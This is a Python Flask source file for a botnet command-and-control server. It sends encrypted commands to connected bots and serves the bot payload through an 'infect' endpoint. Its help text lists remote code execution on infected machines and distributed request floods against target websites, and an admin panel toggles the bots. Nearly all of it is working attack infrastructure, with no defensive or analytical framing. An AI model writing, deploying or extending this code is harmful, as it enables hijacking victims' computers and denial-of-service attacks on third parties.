# imports
import subprocess, flask, threading
from flask import request, jsonify
from os import system, name
from cryptography.fernet import Fernet
import logging, base64, time, string, random, urllib.parse
import pyperclip as pc

#  define server settings and setting admin password
host = "0.0.0.0"
port = 80
fernetkey = Fernet.generate_key()
global adminpass
adminpass = str("".join(
  random.choices(string.ascii_lowercase + string.digits, k=7)))


# clear the console supporting cross platform
def clear():
  if name == "nt":
    _ = system("cls")
  else:
    _ = system("clear")


# fancy date
def datetime():
  part1 = str(time.localtime()).replace("time.struct_time(", "")
  part2 = part1.replace(")", "")
  part3 = part2.replace(",", "")
  part4 = part3.replace(" ", ":")
  (
    raw_year,
    raw_month,
    raw_day,
    raw_hour,
    raw_minute,
    raw_seconds,
    empty1,
    empty2,
    empty3,
  ) = part4.split(":")
  year = raw_year.replace("tm_year=", "")
  month = raw_month.replace("tm_mon=", "")
  day = raw_day.replace("tm_mday=", "")
  hour = raw_hour.replace("tm_hour=", "")
  minute = raw_minute.replace("tm_min=", "")
  seconds = raw_seconds.replace("tm_sec=", "")
  return f"[{month}/{day}/{year}][{hour}:{minute}:{seconds}]"


def encode(data, key):
  f = Fernet(key)
  token = f.encrypt(data.encode("utf-8"))
  return (token.decode("utf-8"))


def decode(data, key):
  f = Fernet(key)
  return ((f.decrypt(data)).decode("utf-8"))


# get the contents of the command file
def getcommand():
  with open("txt/command.txt", "r+") as commandfile:
    command = commandfile.readlines()[-1]
    return command


# set the content of the command file
def setcommand(command):
  with open("txt/command.txt", "a") as commandfile:
    commandfile.writelines(f"\n{command}")
    commandfile.close()
    return command


# toggle the bots
def bottoggle():
  global x
  x = not x
  if x == True:
    with open("txt/bottoggle.txt", "a") as bottogglefile:
      bottogglefile.writelines("\nlisten")
      bottogglefile.close()
      print("cnc > bots set to Listen")
      return "listen"
  else:
    with open("txt/bottoggle.txt", "a") as bottogglefile:
      bottogglefile.writelines("\noff")
      bottogglefile.close()
      print("cnc > bots set to Off")
      return "off"


# define the app and some basic values

app = flask.Flask(__name__)
x = True
bots = 0


# the main page
@app.route("/", methods=["GET"])
def api_home():
  with open("html/index.html", "r") as f:
    html = f.read()
  return html


# the login page
@app.route("/login", methods=["GET"])
def api_login():
  with open("html/login.html", "r") as f:
    html = f.read()
  return html


# where the bot checks if its toggled or not
@app.route("/check", methods=["GET"])
def api_check():
  with open("txt/bottoggle.txt", "r+") as bottogglefile:
    istoggled = bottogglefile.readlines()[-1]
    return encode(istoggled, fernetkey)


sessionhandle = 0


def sessionkill():
  global sessionhandle
  sessionhandle = 1
  print(f"cnc > killed session {adminpass}")


@app.route("/session", methods=["GET"])
def session():

  def errorpage():
    with open("html/404.html", "r") as f:
      errorpage = f.read()
    return errorpage

  if sessionhandle == 0:
    with open("html/new.html", "r") as f:
      html = f.read()
    print(f"cnc > session created with admin password {adminpass}")
    sessionkill()
    return html.replace("{adminpass}", adminpass)

  elif sessionhandle == 1:
    print(f"cnc > session expired with admin password {adminpass}")
    return errorpage()

  else:
    print(f"cnc > session error with admin password {adminpass}")
    return errorpage()


# where the bot gets controlled
@app.route("/bot", methods=["GET"])
def api_bot():
  if "toggle" in request.args:
    return bottoggle()
  elif "connect" in request.args:
    print(f"cnc > bot connected! > {request.args['connect']}")
    return "connected"
  elif "infect" in request.args:
    with open("bot.py") as f:
      contents = f.read()
      return contents
  else:
    command = getcommand()
    return encode(command, fernetkey)


# the main cnc access
@app.route("/cnc", methods=["GET"])
def api_cnc():
  if "command" in request.args:
    command = request.args["command"]
    setcommand(command)
    print(f"cnc > set command > {command} > {encode(command, fernetkey)}")
    return f"set command : {command} > {encode(command, fernetkey)}\n"
  elif "help" in request.args:
    return """
  ├── Spaces = %%
  ├── Remote Code Executon
  │   └── /cnc?command=*rce*uname%%-a\n
  ├── Distributed Request flood
  │   └── /cnc?command=*req*https://google.com::100::10
  ├── Print Message
  │   └── /cnc?command=*print*Hello%%World\n"""
  else:
    with open("html/404.html", "r") as f:
      errorpage = f.read()
    return errorpage


# the admin/auth


@app.route("/admin", methods=["GET"])
def admin():
  if "passwordcheck" in request.args:
    global adminpass
    if request.args["passwordcheck"] == adminpass:
      print(f"cnc > Admin authenticated ({adminpass}")
      return str(
        (base64.b64encode(adminpass.encode("utf-8")))).replace("=", "")
    else:
      print(f"cnc > Admin authentication failed ({adminpass})")
      return "bad"
  else:
    with open("html/404.html", "r") as f:
      errorpage = f.read()
    return errorpage


@app.route("/key", methods=["GET"])
def key():
  return fernetkey


# the main panel
@app.route("/panel", methods=["GET"])
def panel():
  if "auth" in request.args:
    global adminpass
    if request.args["auth"] == str(
      (base64.b64encode(adminpass.encode("utf-8")))).replace("=", ""):
      with open("html/panel.html", "r") as f:
        panel_page = f.read()
      adminpass = str("".join(
        random.choices(string.ascii_lowercase + string.digits, k=7)))
      clear()
      print(banner())
      print("cnc > Admin Authenticated")
      print("cnc > Admin Logged into panel")
      print(f"cnc > Admin password changed > {adminpass}")
      return panel_page
    else:
      with open("html/404.html", "r") as f:
        errorpage = f.read()
      return errorpage
  else:
    with open("html/404.html", "r") as f:
      errorpage = f.read()
    return errorpage


# goofy ahh temp way to call the style.css
@app.route("/style.css", methods=["GET"])
def style():
  with open("html/style.css", "r") as f:
    css = f.read()
  return css


# server log banner
def banner():
  return f"""
  Flask Cnc Server
  ├── Started at {datetime()}
  ├── Host           : {host}
  │   └── Port       : {port}
  ├── Fernet Key     : {fernetkey}
  │   └── Test encryption
  │       ├── {encode("Hello, World!", fernetkey)}
  │       └── {decode((encode("Hello, World!", fernetkey)), fernetkey)}
  └── Admin Password : {adminpass}
"""


# disable the flask logs
log = logging.getLogger("werkzeug")
log.disabled = True
# clear the console
clear()
# print the banner
print(banner())
# start the server and telnet thread
# threading.Thread(target=telnetthread).start()
app.run(host=host, port=port, debug=True)
